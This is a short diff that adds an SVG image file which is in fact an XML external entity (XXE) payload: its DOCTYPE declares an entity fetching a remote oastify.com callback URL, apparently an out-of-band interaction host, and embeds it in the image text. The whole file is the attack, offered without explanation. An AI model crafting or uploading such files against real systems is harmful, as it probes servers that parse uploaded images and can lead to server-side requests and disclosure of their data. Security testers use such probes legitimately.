@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ 
+<!ENTITY xxe SYSTEM "http://659j7khugafo8yr67ajeeozobfh65wtl.oastify.com" > 
+]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+ <text x="5" y="30" font-size="5">&xxe;</text>
+</svg>
